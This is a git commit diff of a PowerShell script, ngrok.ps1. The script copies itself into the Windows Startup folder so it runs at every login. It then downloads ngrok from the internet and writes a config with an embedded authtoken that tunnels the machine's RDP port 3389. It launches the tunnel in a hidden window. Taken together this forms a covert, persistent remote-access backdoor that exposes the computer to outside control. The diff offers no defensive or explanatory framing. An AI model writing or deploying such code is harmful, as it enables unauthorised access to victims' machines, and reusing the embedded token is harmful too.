0805d4a7a6798c03550b4af30620fa1ab6b26798
psychoraze <psychorazed@gmail.com>
2025-05-27 01:14:44 +0500

    4

--- ngrok.ps1
+++ ngrok.ps1
@@ -1,21 +1,29 @@
-Start-Process powershell -WindowStyle Hidden -ArgumentList {
-    $ngrokPath = "$env:APPDATA\ngrok\ngrok.exe"
-    $configPath = "$env:APPDATA\ngrok\ngrok.yml"
+$thisScript = $MyInvocation.MyCommand.Path
 
-    if (!(Test-Path $ngrokPath)) {
-        Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip" -OutFile "$env:TEMP\ngrok.zip"
-        Expand-Archive "$env:TEMP\ngrok.zip" -DestinationPath "$env:APPDATA\ngrok"
-    }
+$startupScriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ngrok.ps1"
 
-    if (!(Test-Path $configPath)) {
-        @"
+if ($thisScript -ne $startupScriptPath -and !(Test-Path $startupScriptPath)) {
+    Copy-Item -Path $thisScript -Destination $startupScriptPath
+    exit
+}
+
+$ngrokPath = "$env:APPDATA\ngrok\ngrok.exe"
+$configPath = "$env:APPDATA\ngrok\ngrok.yml"
+
+if (!(Test-Path $ngrokPath)) {
+    Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip" -OutFile "$env:TEMP\ngrok.zip"
+    Expand-Archive "$env:TEMP\ngrok.zip" -DestinationPath "$env:APPDATA\ngrok"
+}
+
+if (!(Test-Path $configPath)) {
+@"
 authtoken: 2xe3OPcwxui4icUAn8vBgxysHzH_6ceP3DS71bZm5mRxktwua
 tunnels:
   rdp:
     addr: 3389
     proto: tcp
 "@ | Out-File -Encoding ASCII $configPath
-    }
-
-    Start-Process -WindowStyle Hidden -FilePath $ngrokPath -ArgumentList "start rdp"
 }
+
+# Запускаем ngrok в фоне
+Start-Process -WindowStyle Hidden -FilePath $ngrokPath -ArgumentList "start rdp"
